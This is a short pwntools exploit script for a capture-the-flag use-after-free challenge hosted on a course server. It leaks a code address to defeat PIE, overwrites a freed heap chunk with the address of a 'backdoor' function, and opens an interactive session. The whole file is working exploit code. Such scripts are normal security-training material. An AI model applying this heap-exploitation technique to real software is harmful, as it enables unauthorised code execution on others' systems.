from pwn import *

local = False
elf = 'uaf' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10177
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc-2.23.so')
raw_input("aaa")



print r.recvuntil(': ')
r.send(str(0x10))
print r.recvuntil(': ')
r.send('a' * 8)
r.recvuntil('a' * 8)
bye = 0xa77
backdoor = 0xab5
pie = u64( r.recv(6) + '\0\0' ) - bye
success("pie -> %s",hex(pie))

print r.recvuntil(': ')
r.send(str(0x10))
print r.recvuntil(': ')
r.send('a' * 8 + p64(pie + 0xab5))

print r.recvuntil(': ')
r.send(str(0x80))
print r.recvuntil(': ')
r.send('a' * 8)

r.interactive()
